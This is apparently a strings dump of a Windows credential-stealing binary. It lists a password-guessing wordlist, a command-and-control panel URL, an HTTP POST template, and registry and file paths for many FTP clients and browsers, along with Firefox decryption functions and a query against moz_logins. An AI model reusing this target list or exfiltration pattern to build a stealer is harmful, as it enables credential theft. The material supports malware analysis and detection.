[Strings]
nth  paddr      vaddr      len size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0    0x0000004d 0x0000004d 44  45           ascii   !This program cannot be run in DOS mode.\r\r\n$
1    0x00000088 0x00000088 4   5            ascii   FJ'U
2    0x00000178 0x00000178 5   6            ascii   .text
3    0x0000019f 0x0000019f 7   8            ascii   `.rdata
4    0x000001c7 0x000001c7 6   7            ascii   @.data
787  0x0000f7aa 0x004115aa 4   5    .data   ascii   mike
788  0x0000f7af 0x004115af 6   7    .data   ascii   dallas
789  0x0000f7b6 0x004115b6 5   6    .data   ascii   green
790  0x0000f7bc 0x004115bc 8   9    .data   ascii   testtest
791  0x0000f7c5 0x004115c5 8   9    .data   ascii   maverick
792  0x0000f7ce 0x004115ce 7   8    .data   ascii   onelove
793  0x0000f7d6 0x004115d6 5   6    .data   ascii   david
794  0x0000f7dc 0x004115dc 6   7    .data   ascii   mylove
795  0x0000f7e3 0x004115e3 6   7    .data   ascii   church
796  0x0000f7ea 0x004115ea 6   7    .data   ascii   friend
797  0x0000f7f5 0x004115f5 7   8    .data   ascii   destiny
798  0x0000f7fd 0x004115fd 4   5    .data   ascii   none
799  0x0000f802 0x00411602 9   10   .data   ascii   microsoft
800  0x0000f80c 0x0041160c 6   7    .data   ascii   222222
801  0x0000f813 0x00411613 7   8    .data   ascii   bubbles
802  0x0000f81b 0x0041161b 8   9    .data   ascii   11111111
803  0x0000f824 0x00411624 8   9    .data   ascii   cocacola
804  0x0000f82d 0x0041162d 8   9    .data   ascii   jordan23
805  0x0000f836 0x00411636 8   9    .data   ascii   ilovegod
806  0x0000f83f 0x0041163f 9   10   .data   ascii   football1
807  0x0000f849 0x00411649 6   7    .data   ascii   loving
808  0x0000f850 0x00411650 6   7    .data   ascii   nathan
809  0x0000f857 0x00411657 8   9    .data   ascii   emmanuel
810  0x0000f860 0x00411660 6   7    .data   ascii   scooby
811  0x0000f867 0x00411667 7   8    .data   ascii   fuckoff
812  0x0000f86f 0x0041166f 5   6    .data   ascii   sammy
813  0x0000f875 0x00411675 7   8    .data   ascii   maxwell
814  0x0000f87d 0x0041167d 5   6    .data   ascii   jason
815  0x0000f883 0x00411683 4   5    .data   ascii   john
816  0x0000f888 0x00411688 8   9    .data   ascii   1q2w3e4r
817  0x0000f891 0x00411691 4   5    .data   ascii   baby
818  0x0000f896 0x00411696 6   7    .data   ascii   red123
819  0x0000f89d 0x0041169d 6   7    .data   ascii   blabla
820  0x0000f8a4 0x004116a4 6   7    .data   ascii   prince
821  0x0000f8ab 0x004116ab 5   6    .data   ascii   qwert
822  0x0000f8b1 0x004116b1 7   8    .data   ascii   chelsea
823  0x0000f8b9 0x004116b9 5   6    .data   ascii   55555
824  0x0000f8bf 0x004116bf 6   7    .data   ascii   angel1
825  0x0000f8c6 0x004116c6 8   9    .data   ascii   hardcore
826  0x0000f8cf 0x004116cf 6   7    .data   ascii   dexter
827  0x0000f8d6 0x004116d6 5   6    .data   ascii   saved
828  0x0000f8dc 0x004116dc 6   7    .data   ascii   112233
829  0x0000f8e3 0x004116e3 5   6    .data   ascii   hallo
830  0x0000f8e9 0x004116e9 6   7    .data   ascii   jasper
831  0x0000f8f0 0x004116f0 8   9    .data   ascii   danielle
832  0x0000f8f9 0x004116f9 6   7    .data   ascii   kitten
833  0x0000f900 0x00411700 6   7    .data   ascii   cassie
834  0x0000f907 0x00411707 6   7    .data   ascii   stella
835  0x0000f90e 0x0041170e 6   7    .data   ascii   prayer
836  0x0000f915 0x00411715 6   7    .data   ascii   hotdog
837  0x0000f91c 0x0041171c 7   8    .data   ascii   windows
838  0x0000f924 0x00411724 7   8    .data   ascii   mustdie
839  0x0000f92c 0x0041172c 5   6    .data   ascii   gates
840  0x0000f932 0x00411732 9   10   .data   ascii   billgates
841  0x0000f93c 0x0041173c 6   7    .data   ascii   ghbdtn
842  0x0000f943 0x00411743 6   7    .data   ascii   gfhjkm
843  0x0000f94a 0x0041174a 10  11   .data   ascii   1234567890
844  0x0000f956 0x00411756 5   6    .data   ascii   6:468
845  0x0000f95c 0x0041175c 32  33   .data   ascii   http://cgi-bim.ru/panel/gate.php
846  0x0000f97e 0x0041177e 39  40   .data   ascii   YUIPWDFILE0YUIPKDFILE0YUICRYPTED0YUI1.0
847  0x0000f9ac 0x004117ac 4   5    .data   ascii   MODU
848  0x0000f9ba 0x004117ba 51  52   .data   ascii   SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
849  0x0000f9ee 0x004117ee 15  16   .data   ascii   UninstallString
850  0x0000f9fe 0x004117fe 11  12   .data   ascii   DisplayName
851  0x0000fa14 0x00411814 4   5    .data   ascii   .exe
852  0x0000fa19 0x00411819 15  16   .data   ascii   Software\WinRAR
853  0x0000fa29 0x00411829 4   5    .data   ascii   open
854  0x0000fa32 0x00411832 12  13   .data   ascii   kernel32.dll
855  0x0000fa3f 0x0041183f 28  29   .data   ascii   WTSGetActiveConsoleSessionId
856  0x0000fa5c 0x0041185c 20  21   .data   ascii   ProcessIdToSessionId
857  0x0000fa72 0x00411872 12  13   .data   ascii   netapi32.dll
858  0x0000fa7f 0x0041187f 16  17   .data   ascii   NetApiBufferFree
859  0x0000fa90 0x00411890 11  12   .data   ascii   NetUserEnum
860  0x0000fa9d 0x0041189d 9   10   .data   ascii   ole32.dll
861  0x0000faa7 0x004118a7 14  15   .data   ascii   StgOpenStorage
862  0x0000fab7 0x004118b7 12  13   .data   ascii   advapi32.dll
863  0x0000fac4 0x004118c4 24  25   .data   ascii   AllocateAndInitializeSid
864  0x0000fadd 0x004118dd 20  21   .data   ascii   CheckTokenMembership
865  0x0000faf2 0x004118f2 7   8    .data   ascii   FreeSid
866  0x0000fafa 0x004118fa 14  15   .data   ascii   CredEnumerateA
867  0x0000fb09 0x00411909 8   9    .data   ascii   CredFree
868  0x0000fb12 0x00411912 15  16   .data   ascii   CryptGetUserKey
869  0x0000fb22 0x00411922 14  15   .data   ascii   CryptExportKey
870  0x0000fb31 0x00411931 15  16   .data   ascii   CryptDestroyKey
871  0x0000fb41 0x00411941 19  20   .data   ascii   CryptReleaseContext
872  0x0000fb55 0x00411955 12  13   .data   ascii   RevertToSelf
873  0x0000fb62 0x00411962 16  17   .data   ascii   OpenProcessToken
874  0x0000fb73 0x00411973 23  24   .data   ascii   ImpersonateLoggedOnUser
875  0x0000fb8b 0x0041198b 19  20   .data   ascii   GetTokenInformation
876  0x0000fb9f 0x0041199f 22  23   .data   ascii   ConvertSidToStringSidA
877  0x0000fbb6 0x004119b6 10  11   .data   ascii   LogonUserA
878  0x0000fbc1 0x004119c1 21  22   .data   ascii   LookupPrivilegeValueA
879  0x0000fbd7 0x004119d7 21  22   .data   ascii   AdjustTokenPrivileges
880  0x0000fbee 0x004119ee 11  12   .data   ascii   crypt32.dll
881  0x0000fbfa 0x004119fa 18  19   .data   ascii   CryptUnprotectData
882  0x0000fc0d 0x00411a0d 20  21   .data   ascii   CertOpenSystemStoreA
883  0x0000fc22 0x00411a22 27  28   .data   ascii   CertEnumCertificatesInStore
884  0x0000fc3e 0x00411a3e 14  15   .data   ascii   CertCloseStore
885  0x0000fc4d 0x00411a4d 33  34   .data   ascii   CryptAcquireCertificatePrivateKey
886  0x0000fc70 0x00411a70 7   8    .data   ascii   msi.dll
887  0x0000fc78 0x00411a78 20  21   .data   ascii   MsiGetComponentPathA
888  0x0000fc8e 0x00411a8e 11  12   .data   ascii   pstorec.dll
889  0x0000fc9a 0x00411a9a 20  21   .data   ascii   PStoreCreateInstance
890  0x0000fd24 0x00411b24 11  12   .data   ascii   shell32.dll
891  0x0000fd30 0x00411b30 16  17   .data   ascii   SHGetFolderPathA
892  0x0000fd86 0x00411b86 12  13   .data   ascii   My Documents
893  0x0000fd9b 0x00411b9b 7   8    .data   ascii   AppData
894  0x0000fdab 0x00411bab 13  14   .data   ascii   Local AppData
895  0x0000fdc1 0x00411bc1 5   6    .data   ascii   Cache
896  0x0000fdcf 0x00411bcf 7   8    .data   ascii   Cookies
897  0x0000fddf 0x00411bdf 7   8    .data   ascii   History
898  0x0000fdef 0x00411bef 12  13   .data   ascii   My Documents
899  0x0000fe04 0x00411c04 14  15   .data   ascii   Common AppData
900  0x0000fe1b 0x00411c1b 11  12   .data   ascii   My Pictures
901  0x0000fe2f 0x00411c2f 16  17   .data   ascii   Common Documents
902  0x0000fe48 0x00411c48 27  28   .data   ascii   Common Administrative Tools
903  0x0000fe6c 0x00411c6c 20  21   .data   ascii   Administrative Tools
904  0x0000fe89 0x00411c89 8   9    .data   ascii   Personal
905  0x0000fe92 0x00411c92 64  65   .data   ascii   Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
906  0x0000fed3 0x00411cd3 12  13   .data   ascii   explorer.exe
907  0x0000fee0 0x00411ce0 8   9    .data   ascii   S-1-5-18
908  0x0000feed 0x00411ced 22  23   .data   ascii   SeImpersonatePrivilege
909  0x0000ff04 0x00411d04 14  15   .data   ascii   SeTcbPrivilege
910  0x0000ff13 0x00411d13 23  24   .data   ascii   SeChangeNotifyPrivilege
911  0x0000ff2b 0x00411d2b 22  23   .data   ascii   SeCreateTokenPrivilege
912  0x0000ff42 0x00411d42 17  18   .data   ascii   SeBackupPrivilege
913  0x0000ff54 0x00411d54 18  19   .data   ascii   SeRestorePrivilege
914  0x0000ff67 0x00411d67 24  25   .data   ascii   SeIncreaseQuotaPrivilege
915  0x0000ff80 0x00411d80 29  30   .data   ascii   SeAssignPrimaryTokenPrivilege
916  0x0000ff9f 0x00411d9f 243 244  .data   ascii   POST %s HTTP/1.0\r\nHost: %s\r\nAccept: */*\r\nAccept-Encoding: identity, *;q=0\r\nContent-Length: %lu\r\nConnection: close\r\nContent-Type: application/octet-stream\r\nContent-Encoding: binary\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)\r\n\r\n
917  0x00010093 0x00411e93 15  16   .data   ascii   Content-Length:
918  0x000100a3 0x00411ea3 9   10   .data   ascii   Location:
919  0x000100b2 0x00411eb2 4   5    .data   ascii   \*.*
920  0x000100bb 0x00411ebb 4   5    .data   ascii   HWID
921  0x000100c0 0x00411ec0 50  51   .data   ascii   {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}
922  0x000100f3 0x00411ef3 19  20   .data   ascii   GetNativeSystemInfo
923  0x00010107 0x00411f07 12  13   .data   ascii   kernel32.dll
924  0x00010114 0x00411f14 14  15   .data   ascii   IsWow64Process
925  0x00010123 0x00411f23 30  31   .data   ascii   Software\Far\Plugins\FTP\Hosts
926  0x00010142 0x00411f42 31  32   .data   ascii   Software\Far2\Plugins\FTP\Hosts
927  0x00010162 0x00411f62 38  39   .data   ascii   Software\Far Manager\Plugins\FTP\Hosts
928  0x00010189 0x00411f89 39  40   .data   ascii   Software\Far\SavedDialogHistory\FTPHost
929  0x000101b1 0x00411fb1 40  41   .data   ascii   Software\Far2\SavedDialogHistory\FTPHost
930  0x000101da 0x00411fda 47  48   .data   ascii   Software\Far Manager\SavedDialogHistory\FTPHost
931  0x0001020a 0x0041200a 8   9    .data   ascii   Password
932  0x00010213 0x00412013 8   9    .data   ascii   HostName
933  0x0001021c 0x0041201c 4   5    .data   ascii   User
934  0x00010221 0x00412021 4   5    .data   ascii   Line
935  0x00010226 0x00412026 9   10   .data   ascii   \Ipswitch
936  0x00010230 0x00412030 6   7    .data   ascii   Sites\
937  0x00010237 0x00412037 16  17   .data   ascii   \Ipswitch\WS_FTP
938  0x00010248 0x00412048 8   9    .data   ascii   \win.ini
939  0x00010251 0x00412051 4   5    .data   ascii   .ini
940  0x00010256 0x00412056 6   7    .data   ascii   WS_FTP
941  0x00010261 0x00412061 6   7    .data   ascii   DEFDIR
942  0x00010268 0x00412068 7   8    .data   ascii   CUTEFTP
943  0x00010270 0x00412070 9   10   .data   ascii   QCHistory
944  0x0001027a 0x0041207a 45  46   .data   ascii   Software\GlobalSCAPE\CuteFTP 6 Home\QCToolbar
945  0x000102a8 0x004120a8 53  54   .data   ascii   Software\GlobalSCAPE\CuteFTP 6 Professional\QCToolbar
946  0x000102de 0x004120de 45  46   .data   ascii   Software\GlobalSCAPE\CuteFTP 7 Home\QCToolbar
947  0x0001030c 0x0041210c 53  54   .data   ascii   Software\GlobalSCAPE\CuteFTP 7 Professional\QCToolbar
948  0x00010342 0x00412142 45  46   .data   ascii   Software\GlobalSCAPE\CuteFTP 8 Home\QCToolbar
949  0x00010370 0x00412170 53  54   .data   ascii   Software\GlobalSCAPE\CuteFTP 8 Professional\QCToolbar
950  0x000103a6 0x004121a6 20  21   .data   ascii   \GlobalSCAPE\CuteFTP
951  0x000103bb 0x004121bb 24  25   .data   ascii   \GlobalSCAPE\CuteFTP Pro
952  0x000103d4 0x004121d4 25  26   .data   ascii   \GlobalSCAPE\CuteFTP Lite
953  0x000103ee 0x004121ee 8   9    .data   ascii   \CuteFTP
954  0x000103f7 0x004121f7 7   8    .data   ascii   \sm.dat
955  0x000103ff 0x004121ff 19  20   .data   ascii   Software\FlashFXP\3
956  0x00010413 0x00412213 17  18   .data   ascii   Software\FlashFXP
957  0x00010425 0x00412225 19  20   .data   ascii   Software\FlashFXP\4
958  0x00010439 0x00412239 17  18   .data   ascii   InstallerDathPath
959  0x0001044b 0x0041224b 4   5    .data   ascii   path
960  0x00010450 0x00412250 12  13   .data   ascii   Install Path
961  0x0001045d 0x0041225d 10  11   .data   ascii   DataFolder
962  0x00010468 0x00412268 10  11   .data   ascii   \Sites.dat
963  0x00010473 0x00412273 10  11   .data   ascii   \Quick.dat
964  0x0001047e 0x0041227e 12  13   .data   ascii   \History.dat
965  0x0001048b 0x0041228b 11  12   .data   ascii   \FlashFXP\3
966  0x00010497 0x00412297 11  12   .data   ascii   \FlashFXP\4
967  0x000104a3 0x004122a3 10  11   .data   ascii   \FileZilla
968  0x000104ae 0x004122ae 16  17   .data   ascii   \sitemanager.xml
969  0x000104bf 0x004122bf 18  19   .data   ascii   \recentservers.xml
970  0x000104d2 0x004122d2 14  15   .data   ascii   \filezilla.xml
971  0x000104e1 0x004122e1 18  19   .data   ascii   Software\FileZilla
972  0x000104f4 0x004122f4 25  26   .data   ascii   Software\FileZilla Client
973  0x0001050e 0x0041230e 11  12   .data   ascii   Install_Dir
974  0x0001051a 0x0041231a 4   5    .data   ascii   Host
975  0x0001051f 0x0041231f 4   5    .data   ascii   User
976  0x00010524 0x00412324 4   5    .data   ascii   Pass
977  0x00010529 0x00412329 4   5    .data   ascii   Port
978  0x0001052e 0x0041232e 10  11   .data   ascii   Remote Dir
979  0x00010539 0x00412339 11  12   .data   ascii   Server Type
980  0x00010545 0x00412345 11  12   .data   ascii   Server.Host
981  0x00010551 0x00412351 11  12   .data   ascii   Server.User
982  0x0001055d 0x0041235d 11  12   .data   ascii   Server.Pass
983  0x00010569 0x00412369 11  12   .data   ascii   Server.Port
984  0x00010575 0x00412375 4   5    .data   ascii   Path
985  0x0001057a 0x0041237a 10  11   .data   ascii   ServerType
986  0x00010585 0x00412385 16  17   .data   ascii   Last Server Host
987  0x00010596 0x00412396 16  17   .data   ascii   Last Server User
988  0x000105a7 0x004123a7 16  17   .data   ascii   Last Server Pass
989  0x000105b8 0x004123b8 16  17   .data   ascii   Last Server Port
990  0x000105c9 0x004123c9 16  17   .data   ascii   Last Server Path
991  0x000105da 0x004123da 16  17   .data   ascii   Last Server Type
992  0x000105eb 0x004123eb 13  14   .data   ascii   FTP Navigator
993  0x000105f9 0x004123f9 13  14   .data   ascii   FTP Commander
994  0x00010607 0x00412407 11  12   .data   ascii   ftplist.txt
995  0x00010613 0x00412413 21  22   .data   ascii   \BulletProof Software
996  0x00010629 0x00412429 4   5    .data   ascii   .dat
997  0x0001062e 0x0041242e 4   5    .data   ascii   .bps
998  0x00010633 0x00412433 36  37   .data   ascii   Software\BPFTP\Bullet Proof FTP\Main
999  0x00010658 0x00412458 57  58   .data   ascii   Software\BulletProof Software\BulletProof FTP Client\Main
1000 0x00010692 0x00412492 39  40   .data   ascii   Software\BPFTP\Bullet Proof FTP\Options
1001 0x000106ba 0x004124ba 60  61   .data   ascii   Software\BulletProof Software\BulletProof FTP Client\Options
1002 0x000106f7 0x004124f7 14  15   .data   ascii   Software\BPFTP
1003 0x00010706 0x00412506 15  16   .data   ascii   LastSessionFile
1004 0x00010716 0x00412516 8   9    .data   ascii   SitesDir
1005 0x0001071f 0x0041251f 11  12   .data   ascii   InstallDir1
1006 0x0001072b 0x0041252b 4   5    .data   ascii   .xml
1007 0x00010730 0x00412530 9   10   .data   ascii   \SmartFTP
1008 0x0001073a 0x0041253a 13  14   .data   ascii   Favorites.dat
1009 0x00010748 0x00412548 11  12   .data   ascii   History.dat
1010 0x00010754 0x00412554 10  11   .data   ascii   addrbk.dat
1011 0x0001075f 0x0041255f 9   10   .data   ascii   quick.dat
1012 0x00010769 0x00412569 9   10   .data   ascii   \TurboFTP
1013 0x00010773 0x00412573 17  18   .data   ascii   Software\TurboFTP
1014 0x00010785 0x00412585 11  12   .data   ascii   installpath
1015 0x00010791 0x00412591 19  20   .data   ascii   Software\Sota\FFFTP
1016 0x000107a5 0x004125a5 14  15   .data   ascii   CredentialSalt
1017 0x000107b4 0x004125b4 15  16   .data   ascii   CredentialCheck
1018 0x000107c4 0x004125c4 27  28   .data   ascii   Software\Sota\FFFTP\Options
1019 0x000107e0 0x004125e0 8   9    .data   ascii   Password
1020 0x000107e9 0x004125e9 8   9    .data   ascii   UserName
1021 0x000107f2 0x004125f2 8   9    .data   ascii   HostAdrs
1022 0x000107fb 0x004125fb 9   10   .data   ascii   RemoteDir
1023 0x00010805 0x00412605 4   5    .data   ascii   Port
1024 0x0001080a 0x0041260a 8   9    .data   ascii   HostName
1025 0x00010813 0x00412613 4   5    .data   ascii   Port
1026 0x00010818 0x00412618 8   9    .data   ascii   Username
1027 0x00010821 0x00412621 8   9    .data   ascii   Password
1028 0x0001082a 0x0041262a 11  12   .data   ascii   HostDirName
1029 0x00010836 0x00412636 45  46   .data   ascii   Software\CoffeeCup Software\Internet\Profiles
1030 0x00010864 0x00412664 30  31   .data   ascii   Software\FTPWare\COREFTP\Sites
1031 0x00010883 0x00412683 4   5    .data   ascii   Host
1032 0x00010888 0x00412688 4   5    .data   ascii   User
1033 0x0001088d 0x0041268d 4   5    .data   ascii   Port
1034 0x00010895 0x00412695 4   5    .data   ascii   PthR
1035 0x0001089e 0x0041269e 12  13   .data   ascii   profiles.xml
1036 0x000108ab 0x004126ab 13  14   .data   ascii   \FTP Explorer
1037 0x000108b9 0x004126b9 59  60   .data   ascii   Software\FTP Explorer\FTP Explorer\Workspace\MFCToolBar-224
1038 0x000108f5 0x004126f5 7   8    .data   ascii   Buttons
1039 0x000108fd 0x004126fd 30  31   .data   ascii   Software\FTP Explorer\Profiles
1040 0x0001091c 0x0041271c 8   9    .data   ascii   Password
1041 0x00010925 0x00412725 12  13   .data   ascii   PasswordType
1042 0x00010932 0x00412732 4   5    .data   ascii   Host
1043 0x00010937 0x00412737 5   6    .data   ascii   Login
1044 0x0001093d 0x0041273d 4   5    .data   ascii   Port
1045 0x00010942 0x00412742 11  12   .data   ascii   InitialPath
1046 0x0001094e 0x0041274e 11  12   .data   ascii   FtpSite.xml
1047 0x0001095a 0x0041275a 9   10   .data   ascii   \Frigate3
1048 0x00010964 0x00412764 4   5    .data   ascii   .ini
1049 0x00010969 0x00412769 24  25   .data   ascii   _VanDyke\Config\Sessions
1050 0x00010982 0x00412782 9   10   .data   ascii   \Sessions
1051 0x0001098c 0x0041278c 25  26   .data   ascii   Software\VanDyke\SecureFX
1052 0x000109a6 0x004127a6 11  12   .data   ascii   Config Path
1053 0x000109b2 0x004127b2 8   9    .data   ascii   UltraFXP
1054 0x000109bb 0x004127bb 10  11   .data   ascii   \sites.xml
1055 0x000109c6 0x004127c6 8   9    .data   ascii   \FTPRush
1056 0x000109cf 0x004127cf 12  13   .data   ascii   RushSite.xml
1057 0x000109dc 0x004127dc 6   7    .data   ascii   Server
1058 0x000109e3 0x004127e3 8   9    .data   ascii   Username
1059 0x000109ec 0x004127ec 8   9    .data   ascii   Password
1060 0x000109f5 0x004127f5 7   8    .data   ascii   FtpPort
1061 0x000109fd 0x004127fd 31  32   .data   ascii   Software\Cryer\WebSitePublisher
1062 0x00010a1d 0x0041281d 9   10   .data   ascii   \BitKinex
1063 0x00010a27 0x00412827 11  12   .data   ascii   bitkinex.ds
1064 0x00010a33 0x00412833 6   7    .data   ascii   Server
1065 0x00010a3a 0x0041283a 8   9    .data   ascii   UserName
1066 0x00010a43 0x00412843 8   9    .data   ascii   Password
1067 0x00010a4c 0x0041284c 9   10   .data   ascii   _Password
1068 0x00010a56 0x00412856 9   10   .data   ascii   Directory
1069 0x00010a60 0x00412860 44  45   .data   ascii   Software\NCH Software\ClassicFTP\FTPAccounts
1070 0x00010a8d 0x0041288d 4   5    .data   ascii   .oxc
1071 0x00010a92 0x00412892 4   5    .data   ascii   .oll
1072 0x00010a97 0x00412897 11  12   .data   ascii   ftplast.osd
1073 0x00010aa3 0x004128a3 26  27   .data   ascii   \GPSoftware\Directory Opus
1074 0x00010abe 0x004128be 19  20   .data   ascii   \SharedSettings.ccs
1075 0x00010ad2 0x004128d2 25  26   .data   ascii   \SharedSettings_1_0_5.ccs
1076 0x00010aec 0x004128ec 22  23   .data   ascii   \SharedSettings.sqlite
1077 0x00010b03 0x00412903 28  29   .data   ascii   \SharedSettings_1_0_5.sqlite
1078 0x00010b20 0x00412920 19  20   .data   ascii   \CoffeeCup Software
1079 0x00010b34 0x00412934 7   8    .data   ascii   leapftp
1080 0x00010b3c 0x0041293c 10  11   .data   ascii   unleap.exe
1081 0x00010b47 0x00412947 9   10   .data   ascii   sites.dat
1082 0x00010b51 0x00412951 9   10   .data   ascii   sites.ini
1083 0x00010b5b 0x0041295b 17  18   .data   ascii   \LeapWare\LeapFTP
1084 0x00010b6d 0x0041296d 17  18   .data   ascii   SOFTWARE\LeapWare
1085 0x00010b7f 0x0041297f 11  12   .data   ascii   InstallPath
1086 0x00010b8b 0x0041298b 7   8    .data   ascii   DataDir
1087 0x00010b93 0x00412993 8   9    .data   ascii   Password
1088 0x00010b9c 0x0041299c 8   9    .data   ascii   HostName
1089 0x00010ba5 0x004129a5 8   9    .data   ascii   UserName
1090 0x00010bae 0x004129ae 15  16   .data   ascii   RemoteDirectory
1091 0x00010bbe 0x004129be 10  11   .data   ascii   PortNumber
1092 0x00010bc9 0x004129c9 10  11   .data   ascii   FSProtocol
1093 0x00010bd4 0x004129d4 23  24   .data   ascii   Software\Martin Prikryl
1094 0x00010bec 0x004129ec 13  14   .data   ascii   \32BitFtp.ini
1095 0x00010bfa 0x004129fa 11  12   .data   ascii   NDSites.ini
1096 0x00010c06 0x00412a06 9   10   .data   ascii   \NetDrive
1097 0x00010c10 0x00412a10 8   9    .data   ascii   PassWord
1098 0x00010c1d 0x00412a1d 8   9    .data   ascii   UserName
1099 0x00010c26 0x00412a26 13  14   .data   ascii   RootDirectory
1100 0x00010c34 0x00412a34 4   5    .data   ascii   Port
1101 0x00010c39 0x00412a39 54  55   .data   ascii   Software\South River Technologies\WebDrive\Connections
1102 0x00010c70 0x00412a70 10  11   .data   ascii   ServerType
1103 0x00010c7b 0x00412a7b 11  12   .data   ascii   FTP CONTROL
1104 0x00010c87 0x00412a87 6   7    .data   ascii   FTPCON
1105 0x00010c8e 0x00412a8e 4   5    .data   ascii   .prf
1106 0x00010c93 0x00412a93 9   10   .data   ascii   \Profiles
1107 0x00010ca8 0x00412aa8 7   8    .data   ascii   http://
1108 0x00010cb0 0x00412ab0 8   9    .data   ascii   https://
1109 0x00010cb9 0x00412ab9 6   7    .data   ascii   ftp://
1110 0x00010cc0 0x00412ac0 5   6    .data   ascii   opera
1111 0x00010cc6 0x00412ac6 8   9    .data   ascii   wand.dat
1112 0x00010ccf 0x00412acf 24  25   .data   ascii   _Software\Opera Software
1113 0x00010ce8 0x00412ae8 15  16   .data   ascii   Last Directory3
1114 0x00010cf8 0x00412af8 17  18   .data   ascii   Last Install Path
1115 0x00010d0a 0x00412b0a 29  30   .data   ascii   Opera.HTML\shell\open\command
1116 0x00010d28 0x00412b28 15  16   .data   ascii   wiseftpsrvs.bin
1117 0x00010d38 0x00412b38 7   8    .data   ascii   \AceBIT
1118 0x00010d40 0x00412b40 15  16   .data   ascii   Software\AceBIT
1119 0x00010d54 0x00412b54 63  64   .data   ascii   SOFTWARE\Classes\TypeLib\{CB1F2C0F-8094-4AAC-BCF5-41A64E27F777}
1120 0x00010d94 0x00412b94 63  64   .data   ascii   SOFTWARE\Classes\TypeLib\{9EA55529-E122-4757-BC79-E4825F80732C}
1121 0x00010dd4 0x00412bd4 15  16   .data   ascii   wiseftpsrvs.ini
1122 0x00010de4 0x00412be4 11  12   .data   ascii   wiseftp.ini
1123 0x00010df0 0x00412bf0 14  15   .data   ascii   FTPVoyager.ftp
1124 0x00010dff 0x00412bff 13  14   .data   ascii   FTPVoyager.qc
1125 0x00010e0d 0x00412c0d 14  15   .data   ascii   \RhinoSoft.com
1126 0x00010e1c 0x00412c1c 8   9    .data   ascii   nss3.dll
1127 0x00010e25 0x00412c25 8   9    .data   ascii   NSS_Init
1128 0x00010e2e 0x00412c2e 12  13   .data   ascii   NSS_Shutdown
1129 0x00010e3b 0x00412c3b 22  23   .data   ascii   NSSBase64_DecodeBuffer
1130 0x00010e52 0x00412c52 16  17   .data   ascii   SECITEM_FreeItem
1131 0x00010e63 0x00412c63 23  24   .data   ascii   PK11_GetInternalKeySlot
1132 0x00010e7b 0x00412c7b 17  18   .data   ascii   PK11_Authenticate
1133 0x00010e8d 0x00412c8d 15  16   .data   ascii   PK11SDR_Decrypt
1134 0x00010e9d 0x00412c9d 13  14   .data   ascii   PK11_FreeSlot
1135 0x00010ecc 0x00412ccc 11  12   .data   ascii   sqlite3.dll
1136 0x00010ed8 0x00412cd8 12  13   .data   ascii   sqlite3_open
1137 0x00010ee5 0x00412ce5 13  14   .data   ascii   sqlite3_close
1138 0x00010ef3 0x00412cf3 15  16   .data   ascii   sqlite3_prepare
1139 0x00010f03 0x00412d03 12  13   .data   ascii   sqlite3_step
1140 0x00010f10 0x00412d10 20  21   .data   ascii   sqlite3_column_bytes
1141 0x00010f25 0x00412d25 19  20   .data   ascii   sqlite3_column_blob
1142 0x00010f3a 0x00412d3a 14  15   .data   ascii   mozsqlite3.dll
1143 0x00010f49 0x00412d49 12  13   .data   ascii   sqlite3_open
1144 0x00010f56 0x00412d56 13  14   .data   ascii   sqlite3_close
1145 0x00010f64 0x00412d64 15  16   .data   ascii   sqlite3_prepare
1146 0x00010f74 0x00412d74 12  13   .data   ascii   sqlite3_step
1147 0x00010f81 0x00412d81 20  21   .data   ascii   sqlite3_column_bytes
1148 0x00010f96 0x00412d96 19  20   .data   ascii   sqlite3_column_blob
1149 0x00010fcb 0x00412dcb 12  13   .data   ascii   profiles.ini
1150 0x00010fd8 0x00412dd8 7   8    .data   ascii   Profile
1151 0x00010fe0 0x00412de0 10  11   .data   ascii   IsRelative
1152 0x00010feb 0x00412deb 4   5    .data   ascii   Path
1153 0x00010ff0 0x00412df0 9   10   .data   ascii   PathToExe
1154 0x00010ffa 0x00412dfa 8   9    .data   ascii   prefs.js
1155 0x00011003 0x00412e03 14  15   .data   ascii   signons.sqlite
1156 0x00011012 0x00412e12 11  12   .data   ascii   signons.txt
1157 0x0001101e 0x00412e1e 12  13   .data   ascii   signons2.txt
1158 0x0001102b 0x00412e2b 12  13   .data   ascii   signons3.txt
1159 0x00011044 0x00412e44 69  70   .data   ascii   SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins
